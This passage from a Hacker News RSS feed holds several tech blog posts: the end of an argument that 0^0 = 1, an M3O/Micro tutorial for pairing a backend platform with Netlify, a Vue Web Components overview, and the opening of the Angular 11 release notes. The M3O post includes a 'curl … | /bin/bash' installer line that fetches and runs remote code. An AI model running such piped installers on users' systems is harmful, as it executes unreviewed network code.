<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msup><mi>n</mi><mn>2</mn></msup><msup><mn>3</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup><mo>=</mo><mn>0</mn><mspace linebreak="newline"></mspace><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><mfrac><mn>1</mn><mi>n</mi></mfrac><mo>=</mo><mn>0</mn><mspace linebreak="newline"></mspace><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msup><mrow><mo fence="true">(</mo><msup><mi>n</mi><mn>2</mn></msup><msup><mn>3</mn><mrow><mo>−</mo><mi>n</mi></mrow></msup><mo fence="true">)</mo></mrow><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi></mrow></msup><mo>=</mo><msup><mn>0</mn><mn>0</mn></msup><mo>=</mo><mn>1</mn></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\lim_{n\to\infty} n^2 3^{-n} = 0 \\
\lim_{n\to\infty} \frac{1}{n} = 0 \\
\lim_{n\to\infty} \left(n^2 3^{-n}\right)^{1/n} = 0^0 = 1
</annotation></semantics></math></span></span></p>

<p>Which would give an incorrect answer. The correct answer is 1/3.</p>

<p>However, the mistake is not in the step 0<sup>0</sup> = 1. The mistake already happened in the
previous step, where we simplified the limit to 0<sup>0</sup>.</p>

<p>A common (incorrect) way of thinking about this is: we allow calculating limits separately for
sub-expressions only if the resulting expression makes sense.
If it does not make sense, then doing that is not allowed. If only we declare that 0<sup>0</sup> is not a valid
expression, the reduction to 0<sup>0</sup> will not be allowed, so it solves the problem. If however
we do define 0<sup>0</sup> to mean something, the reduction would be allowed.</p>

<p>That’s what I call the “naive limit algorithm”. It doesn’t work.</p>

<p>Let’s apply the same algorithm to a different limit:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><mn>10</mn><mo>+</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><mo>=</mo><mn>10</mn><mspace linebreak="newline"></mspace><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><mrow><mo fence="true">⌈</mo><mrow><mn>10</mn><mo>+</mo><mfrac><mn>1</mn><mi>n</mi></mfrac></mrow><mo fence="true">⌉</mo></mrow><mo>=</mo><mo stretchy="false">⌈</mo><mn>10</mn><mo stretchy="false">⌉</mo><mo>=</mo><mn>10</mn></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\lim_{n\to\infty} 10 + \frac{1}{n} = 10 \\
\lim_{n\to\infty} \left\lceil{10 + \frac{1}{n}}\right\rceil = \lceil 10 \rceil = 10
</annotation></semantics></math></span></span></p>

<p>There is an error here. The correct value of the last limit is not 10, it is 11. But this time we can’t fix it the same
way: we can’t say “let’s just leave <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mn>10</mn><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil 10 \rceil</annotation></semantics></math></span></span> undefined”.
Everybody agrees that is a valid expression and has to be defined!</p>

<p>The naive limit algorithm simply doesn’t always work.</p>

<p>In general, the algorithm can be described as follows. If:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msub><mi>a</mi><mi>n</mi></msub><mo>=</mo><mi>a</mi><mspace linebreak="newline"></mspace><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msub><mi>b</mi><mi>n</mi></msub><mo>=</mo><mi>b</mi><mspace linebreak="newline"></mspace><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><msub><mi>c</mi><mi>n</mi></msub><mo>=</mo><mi>c</mi><mspace linebreak="newline"></mspace><mo>…</mo></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\lim_{n\to\infty} a_n = a \\
\lim_{n\to\infty} b_n = b \\
\lim_{n\to\infty} c_n = c \\
\ldots
</annotation></semantics></math></span></span></p>
<p>and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mo>…</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(a, b, c, \ldots) </annotation></semantics></math></span></span> is a valid expression, then:</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munder><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>n</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munder><mi>f</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>b</mi><mi>n</mi></msub><mo separator="true">,</mo><msub><mi>c</mi><mi>n</mi></msub><mo separator="true">,</mo><mo>…</mo><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mo>…</mo><mo stretchy="false">)</mo></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
\lim_{n\to\infty} f(a_n, b_n, c_n, \ldots) = f(a, b, c, \ldots)
</annotation></semantics></math></span></span></p>

<p>Is this true? It’s not always true! What we wrote here is precisely the definition of continuity
of f at the point (a, b, c, …). Some functions are not continuous!</p>

<p>Therefore the appropriate condition shouldn’t have been “<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo separator="true">,</mo><mo>…</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(a, b, c, \ldots) </annotation></semantics></math></span></span> is a valid expression”, it should have been “f is continuous at (a, b, c, …)”.</p>

<p>Well, x<sup>y</sup> is simply not continuous at (0, 0). As we saw, even 0<sup>x</sup>
is not continuous at 0. It’s inherently so, it reflects deep mathematical reality.</p>

<p>Refusing to define the operation there doesn’t
really help the situation at all. If we don’t define it at (0, 0), it’s still not going to be continuous there,
 it would not even be defined there, which is worse! We can’t use the naive limit algorithm at that point either way.</p>

<h2 id="conclusion">Conclusion</h2>

<p>I think we should just all agree that:</p>
<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><msup><mn>0</mn><mn>0</mn></msup><mo>=</mo><mn>1</mn></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle 
0^0 = 1
</annotation></semantics></math></span></span></p>

<p>It follows directly from definitions, and it’s a nice and consistent and useful property
of exponentiation. There is no convincing reason to make an exception.</p>

<p>Let me know what you think!</p>

  </div>
  
  
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://sortingsearching.com/2020/11/11/zero-power-zero.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068785</guid>
            <pubDate>Thu, 12 Nov 2020 11:44:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Netlify for the frontend, Micro for the backend]]>
            </title>
            <description>
<![CDATA[
Score 137 | Comments 59 (<a href="https://news.ycombinator.com/item?id=25068782">thread link</a>) | @chuhnk
<br/>
November 12, 2020 | https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html | <a href="https://web.archive.org/web/*/https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">M3O</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-11-12">12 Nov 2020</time>
            
        </span> -->

        <!-- <h1 class="post-title">Netlify for the frontend, Micro for the backend</h1> -->

        <section>
            <p><br>
Today Netlify has emerged as the modern platform for rapidly building web applications without having to worry about anything beyond your code. We at <a href="https://m3o.com/">Micro</a>
are users of Netlify and have bought into this phenomenal experience. What’s more Netlify has demonstrated to us a breakdown in the classic web architecture 
stack which previously combined web and api concerns in a single place. As we moved through a tiered architecture frontend had not been given anything more 
than hints on how to consume dynamic content from the backend. Today we’re all calling this the <a href="https://jamstack.org/">Jamstack</a>.</p>

<h2 id="jamstack">Jamstack</h2>

<p><img src="https://d33wubrfki0l68.cloudfront.net/b7d16f7f3654fb8572360301e60d76df254a323e/385ec/img/svg/architecture.svg"></p>
<center><i><small>Credit jamstack.org</small></i></center>
<p><br>
The jamstack rethinks the frontend architecture by separating the concerns of static and dynamic content and pushing for the dynamic side to be consumed 
through APIs and services. Effectively, Netlify embracing this model has tried to build microservices for the frontend and moved towards a unification 
of consumption of services via APIs on the backend. It’s clear this is the architecture of the future for the web and the majority of cloud services 
will be built and consumed soley as APIs.</p>

<p>The one question we’ve really been seeing a lot though is “What’s Netlify for the backend?”. Many of those frontend users building Jamstack apps on 
Netlify are looking to where they can find and build these APIs. It seems even Netlify’s current answer has been, “go host something on heroku”. I think 
in 2020 this just doesn’t fly. If the frontend is being reimagined then the same has to happen on the backend to cater for that use.</p>

<h2 id="netlify-for-the-backend">Netlify for the Backend</h2>

<p><img src="https://blog.m3o.com/assets/images/netlify.png"></p>

<p><a href="https://m3o.com/"><strong>M3O</strong></a> is a platform for cloud services development. The fastest way to build APIs without managing the infrastructure. M3O makes use of 
<a href="https://micro.mu/"><strong>Micro</strong></a>, an open source platform for microservices development. What we get from Micro is a powerful framework for building, running 
and consuming APIs as microservices. What M3O brings to the table is Micro as a Service, a fully managed platform for building microservices. Write services 
in Go and gRPC on the backend, expose them dynamically via HTTP API to be consumed by the frontend. M3O looks to fill that gap in the market for frontend 
devs. M3O is Netlify for the backend.</p>

<h2 id="m3o-features">M3O Features</h2>

<p>As we mentioned, M3O is a fully managed <a href="https://micro.mu/">Micro</a> services platform. What does that mean? Micro provides the building blocks for 
writing, running and consuming microservices. From source to running and beyond. M3O takes that and hosts it so you can just get on with writing 
APIs without worrying about the underlying infrastructure.</p>

<p>Here’s a few of the key features and services:</p>

<ul>
  <li><strong>Microservices development</strong> using <a href="https://grpc.io/">gRPC</a> and protobuf code generation</li>
  <li><strong>Service runtime</strong> and process lifecycle management</li>
  <li><strong>Source to running</strong> builds without need for CI/CD</li>
  <li><strong>Authentication and authorization</strong> for access control and user management</li>
  <li><strong>Dynamic configuration</strong> and secrets management</li>
  <li><strong>PubSub messaging</strong> and event streaming</li>
  <li><strong>Service discovery</strong> and secure networking</li>
  <li><strong>Key-value storage</strong> and persistent CRUD</li>
  <li><strong>Automatic HTTP routing</strong> with path based resolution</li>
  <li><strong>Identity aware proxy</strong> for remote access and gRPC-web apps</li>
  <li><strong>Public API gateway</strong> and TLS support by default</li>
  <li><strong>Public and private repos</strong> support including  github, gitlab and bitbucket</li>
</ul>

<p>M3O is a feature complete platform for microservices development from generating service templates on your local machine through to writing and running 
it in the cloud all using the same Micro CLI experience. M3O exposes HTTPS urls for you dynamically by default. So every service automatically becomes 
an API as soon as you deploy it.</p>

<p>Where a new development model has emerged for the frontend, we think its dictating the “headless” paradigm shift for the backend and M3O wants to be there 
to host all of those APIs as Micro services.</p>

<h2 id="api-first">API First</h2>

<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/0znow24kgpu2dp3zg60n.png"></p>

<p>We are seeing the emergence of APIs as the dominant form factor for cloud services, from AWS all the way through to Twilio and Stripe. What’s even more 
compelling is while this model has emerged in the past few years, we are only really just getting started. It’s our belief that in a decade from now 
some of the most important companies will be API first yet strangely there is no platform to caters to this form of development.</p>

<p>Twilio, Stripe and others have all had to build out the infrastructure for their API first approach. We think as many more companies go down this path 
the tools must emerge to empower them, not just at the compute layer but by providing the higher level abstractions required. That’s the goal of M3O.</p>

<p>But don’t just take our word for it. We’re going to walk you through a demonstration of the value proposition so you can see for yourself just how 
powerful Micro and M3O are.</p>

<h2 id="building-a-backend">Building a backend</h2>

<p>You’re going to be writing and deploying APIs in minutes rather than hours or days! No more dealing with infrastructure on the 
backend, just as Netlify empowered devs on the frontend, we’re doing the same for a new generation of developers on the backend.</p>

<p>Let’s walk you through it. We’ll deploy an existing Micro blog service with this demo frontend on Netlify: <a href="https://loving-goodall-44ee08.netlify.app/">https://loving-goodall-44ee08.netlify.app/</a>. But first let’s start with signup.</p>

<h3 id="signup-to-m3o">Signup to M3O</h3>

<p>First you start by signing up to M3O and registering for a free account in our Dev environment.</p>

<p>Start by installing micro</p>

<div><div><pre><code>curl <span>-fsSL</span> https://install.m3o.com/micro | /bin/bash
</code></pre></div></div>

<p>For those wary of curl into bash, you can view it first <a href="https://install.m3o.com/micro">https://install.m3o.com/micro</a>.</p>

<p>Signup is purely CLI based for now so just issue the following command and follow the steps</p>



<p>Once you’re done you should have an account on M3O and be automatically logged in.</p>

<h3 id="run-helloworld">Run Helloworld</h3>

<p>Validate that by running helloworld.</p>

<div><div><pre><code>micro run github.com/micro/services/helloworld
</code></pre></div></div>

<p>Check it’s running and try call it via the CLI.</p>

<div><div><pre><code><span># check the status</span>
micro status

<span># call helloworld</span>
micro call helloworld <span>--name</span><span>=</span><span>"Alice"</span>
</code></pre></div></div>

<p>OK now we get to the more interesting part. Call it via the HTTP API that’s dynamically generated for you.</p>

<div><div><pre><code><span># get your namespace</span>
<span>NAMESPACE</span><span>=</span><span>$(</span>micro user namespace<span>)</span>

<span># curl your unique url</span>
curl <span>"https://</span><span>$NAMESPACE</span><span>.m3o.com/helloworld?name=Alice"</span>
</code></pre></div></div>

<p>If alls good, we can move on to running something a bit more interesting.</p>

<h3 id="deploying-a-dynamic-blog-backend">Deploying a dynamic blog backend</h3>

<p>We’re going to deploy a headless CMS, or better known as a Blog API.</p>

<p>On the open source side, Micro maintains some reusable example services we can all play with and contribute back to. 
You can check them out at <a href="https://github.com/micro/services">github.com/micro/services</a>. Let’s bootstrap the blog 
using a couple of them.</p>

<p>Because Micro is all about microservices development, we’ve decomposed the blog API into posts, comments and tags. 
Right now we’ll focus on posts and tags. You can find the code in <a href="https://github.com/micro/services/tree/master/blog">https://github.com/micro/services/tree/master/blog</a>.</p>

<p>Deploying these is super simple.</p>

<div><div><pre><code><span># run the posts service</span>
micro run github.com/micro/services/blog/posts

<span># run the tags service</span>
micro run github.com/micro/services/blog/tags
</code></pre></div></div>

<p>Check they’re running using <code>micro status</code>. You should see the status progress through starting, building and running. 
If you want to see logs or anything related just do <code>micro logs posts</code> and the same for any other service by name.</p>

<h3 id="write-a-post-on-the-cli">Write a post on the CLI</h3>

<p>Once services are running they become immediately callable via the CLI as dynamic commands.</p>

<p>Save a quick post:</p>

<div><div><pre><code>micro posts save <span>--id</span><span>=</span>1 <span>--title</span><span>=</span><span>"My first post"</span> <span>--content</span><span>=</span><span>"This is pretty epic"</span>
</code></pre></div></div>

<p>List posts:</p>



<p>The same calls can be made over the API too, just have to know your namespace:</p>

<h3 id="call-it-via-the-http-api">Call it via the HTTP API</h3>

<p>Now here’s where it gets cool and more importantly what you’ll be calling from your frontend apps 
running on Netlify. First grab your namespace like earlier.</p>

<div><div><pre><code><span>$ </span>micro user namespace
random-example-namespace
</code></pre></div></div>

<p>Now just curl it like any other api</p>

<div><div><pre><code><span>$ </span>curl <span>-H</span> <span>"Micro-Namespace: random-example-namespace"</span> https://api.m3o.dev/posts/query
<span>{</span>
  <span>"posts"</span>: <span>[</span>
    <span>{</span>
      <span>"id"</span>: <span>"1"</span>,
      <span>"title"</span>: <span>"My first post"</span>,
      <span>"slug"</span>: <span>"my-first-post"</span>,
      <span>"content"</span>: <span>"This is pretty epic"</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The generic <code>api.m3o.dev</code> url requires us to pass in our namespace so we query our own service but 
every namespace also gets its own unique URL so you don’t have to worry about this in your frontend 
code. Just compose namespace + m3o.dev as <code>random-example-namespace.m3o.dev</code>.</p>

<div><div><pre><code><span>$ </span>curl https://random-example-namespace.m3o.dev/posts/query
<span>{</span>
  <span>"posts"</span>: <span>[</span>
    <span>{</span>
      <span>"id"</span>: <span>"1"</span>,
      <span>"title"</span>: <span>"My first post"</span>,
      <span>"slug"</span>: <span>"my-first-post"</span>,
      <span>"content"</span>: <span>"This is pretty epic"</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>That’s it! We now have the backend for our frontend running on M3O.</p>

<p>Let’s deploy the sample frontend to Netlify just for kicks.</p>

<h2 id="deploying-the-frontend-to-netlify">Deploying the frontend to Netlify</h2>

<p>The frontend is a simple angular app we’ve put together to validate the premise:</p>

<p><strong>Netlify for the frontend, Micro for the backend</strong></p>

<p>You can find the code in <a href="https://github.com/m3o/blog-frontend">github.com/m3o/blog-frontend</a> but 
we’ll walk you through the install now. The deploy settings for the site hosted under 
<a href="https://loving-goodall-44ee08.netlify.app/">loving-goodall-44ee08.netlify.app</a> are as follows:</p>

<h3 id="build-settings">Build settings</h3>

<center>
<img src="https://blog.m3o.com/assets/images/deploysettings.png">
</center>

<p><br>
You can copy the below settings for ease of use. Where you see ‘concert-celtic-uncover’ replace it with your namespace from <code>micro user namespace</code> on the CLI. 
We need this to know what backend API to call.</p>

<div><div><pre><code>Repository        github.com/m3o/blog-frontend
Base directory    Not set
Build command     sed -i 's/micro/concert-celtic-uncover/g' ./src/environments/environment.prod.ts &amp;&amp; ng build --prod &amp;&amp; cp ./src/assets/_redirects ./dist/blog-frontend
Publish directory dist/blog-frontend
</code></pre></div></div>

<p>As you can see, it’s the original <code>m3o/blog-frontend</code> being deployed in the example, but in your case <code>m3o</code> will be replaced with your fork. 
This is because Netlify asks for the permissions to the repo.</p>

<p>The build command is a bit involved, here is what it’s doing:</p>

<div><div><pre><code><span># Replace the micro namespace with your own</span>
<span>namespace</span><span>=</span><span>$(</span>micro user namespace<span>)</span>

<span>sed</span> <span>-i</span> <span>"s/micro/</span><span>$namespace</span><span>/g"</span> ./src/environments/environment.prod.ts

<span># It's an angular app, so we have to ng build</span>
ng build <span>--prod</span>

<span># Single page …</span></code></pre></div></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html">https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html</a></em></p>]]>
            </description>
            <link>https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068782</guid>
            <pubDate>Thu, 12 Nov 2020 11:44:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Vue – Introduction to Web Components]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068730">thread link</a>) | @oczek
<br/>
November 12, 2020 | https://blog.graphqleditor.com/vue-webcomponents/ | <a href="https://web.archive.org/web/*/https://blog.graphqleditor.com/vue-webcomponents/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://blog.graphqleditor.com/vue-overview/">In my previous blog post I outlined what Vue is</a> and went through a bit of its history and versions one through three and their key features. Like I mentioned there <strong>Web Components have long been a key part of Vue and they are a powerful feature</strong> that deserves a bit more than a brief mention. If you’re not familiar with Vue or you just want to read about it head on here, if not let’s get right into Web Components and what they’re all about.</p>
<h2>The basics</h2>
<p>Web Components are a set of features that let you create new custom, reusable, encapsulated HTML tags for use in web pages and apps. They are supported by every major browser and are backwards compatible through Javascript-based custom libraries. Basically they can be used with any JavaScript library or framework that works with HTML. To be precise Web Components consist of three technologies which work together:</p>
<ul>
<li><strong>Custom Elements</strong> - HTML elements with custom behaviours, templates and tag names made with a set of JavaScript APIs,</li>
<li><strong>Shadow DOM</strong> - a ‘<em>DOM within a DOM</em>’ it’s its own isolated DOM tree with its own elements and styles completely separate from the original DOM. This allows encapsulation and componentization natively on the web platform without having to rely on iframes,</li>
<li><strong>HTML Templates</strong> - a tool for holding HTML which is not to be rendered when a page is loaded but instead can be instantiated when called upon.</li>
</ul>
<h2>What’s that got to do with Vue?</h2>
<p>Now with that brief outline of the general functionality of Web Components behind us, let’s focus on where Vue comes in. As mentioned previously the new features in Vue 3 are a major help here when it comes to components. The Composition API offers more flexibility as code can now be organized as functions, each dealing with a specific feature. It also makes extracting and reusing logic between components much easier. Teleport allows specifying template HTML that can be sent to another part of the DOM or even outside the scope of the app. Which is useful if one component has some HTML that has to get rendered in an alternative location for example if it’s run on a widget or a small part of the webpage. Additionally Vue has long provided the ability to package SFCs or single file components as a Web Component, which basically lets you create and use your own custom HTML tags. </p>
<p><span>
      <a href="https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/efb68/teleport_vue.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Teleport in Vuejs" title="Teleport in Vuejs" src="https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/fcda8/teleport_vue.png" srcset="https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/12f09/teleport_vue.png 148w,
https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/e4a3f/teleport_vue.png 295w,
https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/fcda8/teleport_vue.png 590w,
https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/efc66/teleport_vue.png 885w,
https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/c83ae/teleport_vue.png 1180w,
https://blog.graphqleditor.com/static/4ad1916943b9278a860b9925e0e985a2/efb68/teleport_vue.png 2032w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h5>Source: <a href="https://v3.vuejs.org/guide/teleport.html">Vuejs.org</a></h5>
<h2>You’re not on your own</h2>
<p>All this makes Vue a very straightforward and easily customizable tool for developers wanting to work with Web Components. As I mentioned you can quite easily start working on your own components or you can hop on GitHub and check out some of those made by the community. Let’s take a look at that:</p>
<ul>
<li><strong>Vuetify</strong> - a UI framework built on top of Vue.js lets you create clean, semantic, reusable UI components and works with Vue’s Server Side Rendering (SSR). It provides over 80 Vue components which makes for a pretty nice base for creating apps with way less effort.</li>
<li><strong>Vue Material</strong> - a scalable library made exactly in accordance with the Google Material Design specs. Contains over 56 components useful for making complex app shells and will help make apps that can fit on every screen with support for all modern Web Browsers.</li>
<li><strong>Quasar</strong> - a full-fledged framework that supports features like minification and caching. Additionally it provides components for your framework, over 80 of them in fact. It also provides support for each build mode (SPA, SSR, PWA, Mobile app, Desktop app &amp; Browser Extension) and has tight integration with its own CLI. Quasar is fairly extensive and has in-depth documentation and robust end-to-end implementation.   </li>
<li><strong>Buefy</strong> - lightweight UI component library based on Vue and Bulma (a CSS framework) Simply put Buefy provides a JavaScript layer for interfaces created with Bulma CSS. If you’re looking to build apps with a simple and intuitive interface this tool will help you hit the ground running.</li>
<li><strong>iView</strong> - a Vue.js 2.0 based library which provides a number of high quality UI components and widgets. It also has its own CLI tool, iView-cli, which has a visual tool for component scaffolding and an offline version of the documentation. If you’re into neat and elegant design this is the way to go.</li>
</ul>
<p><span>
      <a href="https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/00d43/vue_libs.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Vue Web Components libraries" title="Vue Web Components libraries" src="https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/fcda8/vue_libs.png" srcset="https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/12f09/vue_libs.png 148w,
https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/e4a3f/vue_libs.png 295w,
https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/fcda8/vue_libs.png 590w,
https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/efc66/vue_libs.png 885w,
https://blog.graphqleditor.com/static/0f01bee7dd79d1a66081e33303903fcf/00d43/vue_libs.png 1000w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<h2>Which to choose?</h2>
<p>That’s a lot of components right? The idea is to help get your project off the ground as quickly and easily as possible by providing you with a base of useful components. This way you can start working on your app right away without spending time on making your own components. Not that there’s anything wrong with that, you can add our own components and Vue is a great help with that. Bear in mind most of these tools are geared towards a certain type of app, so you’ll have to check out which one fits your needs best. There’s plenty to choose from on GitHub, you can use them, join one of the communities behind those mentioned above and improve it or even create your own libraries to help others. The possibilities here are almost limitless.</p></div><p>The GraphQL Editor is a supportive tool for both advanced GraphQL users as well as those taking their first steps with GraphQL APIs. Our all-in-one development environment for GraphQL will help you build, manage &amp; deploy your GraphQL API much faster thanks to dozens of built-in micro features. Its graphical interface will also fix communication within your product team. Visualization is the key!</p></div>]]>
            </description>
            <link>https://blog.graphqleditor.com/vue-webcomponents/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068730</guid>
            <pubDate>Thu, 12 Nov 2020 11:33:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Angular 11]]>
            </title>
            <description>
<![CDATA[
Score 147 | Comments 190 (<a href="https://news.ycombinator.com/item?id=25068668">thread link</a>) | @amitport
<br/>
November 12, 2020 | https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7 | <a href="https://web.archive.org/web/*/https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@markathompson?source=post_page-----74721b7952f7--------------------------------" rel="noopener"><img alt="Mark Techson" src="https://miro.medium.com/fit/c/96/96/1*2hqK0rVXWghtk_RLFx33oA.jpeg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Photo of a Torch Ginger by Jules Kremer" src="https://miro.medium.com/max/2368/0*55kr1t601sp22pkE" width="1184" height="1091" srcset="https://miro.medium.com/max/552/0*55kr1t601sp22pkE 276w, https://miro.medium.com/max/1104/0*55kr1t601sp22pkE 552w, https://miro.medium.com/max/1280/0*55kr1t601sp22pkE 640w, https://miro.medium.com/max/1400/0*55kr1t601sp22pkE 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*55kr1t601sp22pkE?q=20"></p></div></div></div><figcaption>Photo of a Torch Ginger by Jules Kremer</figcaption></figure><p id="1feb"><strong>Welcome to the Angular version 11 release.</strong></p><p id="1877">Version 11.0.0 is here and we’ve got some great updates for Angular developers everywhere. This release has updates across the platform including the framework, the CLI and components. Let’s dive in!</p><h2 id="1182">Updates on Operation Byelog</h2><p id="593b">When we shared <a href="https://angular.io/guide/roadmap" rel="noopener">Angular’s Roadmap</a>, one of the items was Operation Byelog where we committed to putting a significant engineering effort towards triaging issues and PRs until we have a clear understanding of the broader community needs. We can now report that the original goal is complete! We’ve triaged all the issues in all three of the monorepos and will continue this as an ongoing effort as new issues get reported.</p><p id="bc06">This is our commitment: Going forward all new issues reported will be triaged within 2 weeks.</p><p id="2104">In the process, we resolved a few <a href="https://github.com/angular/angular/issues/12842" rel="noopener">popular</a> <a href="https://github.com/angular/angular/issues/18469" rel="noopener">issues</a> in the <a href="https://github.com/angular/angular/issues/13011" rel="noopener">router</a> and <a href="https://github.com/angular/angular/issues/14542" rel="noopener">forms</a>.</p><p id="a1cd">Also, we’ve closed the <a href="https://github.com/angular/angular/issues/11405" rel="noopener"><em>third most popular issue</em></a><em>!</em></p><p id="5773">Now, we’re planning the next steps to support the Angular community. We’ll continue triaging and fixing issues, and work towards improving our processes for accepting community contributions.</p><h2 id="4683">Automatic Inlining of Fonts</h2><p id="6a67">To make your apps even faster by speeding up their <a href="https://web.dev/first-contentful-paint/" rel="noopener">first contentful paint</a>, we’re introducing automatic font inlining. During compile time Angular CLI will download and inline fonts that are being used and linked in the application. We enable this by default in apps built with version 11. All you need to do to take advantage of this optimization is update your app!</p><h2 id="124e">Component Test Harnesses</h2><p id="78d2">In Angular v9 we introduced Component Test Harnesses. They provide a robust and legible API surface to help with testing Angular Material components. It gives developers a way to interact with Angular Material components using the supported API during testing.</p><p id="2932">Releasing with version 11, we have harnesses for all of the components! Now developers can create more robust test suites.</p><p id="3e07">We’ve also included performance improvements and new APIs. The <em>parallel</em> function makes working with asynchronous actions in your tests easier by allowing developers to run multiple asynchronous interactions with components in parallel. The <em>manualChangeDetection</em> function gives developers access to finer grained control of change detection by disabling automatic change detection in unit tests.</p><p id="752c">For more details and examples of these APIs and other new features, be sure to check out the <a href="http://material.angular.io/cdk/test-harnesses/overview" rel="noopener">documentation for Angular Material</a> Test Harnesses!</p><h2 id="173a">Improved Reporting and 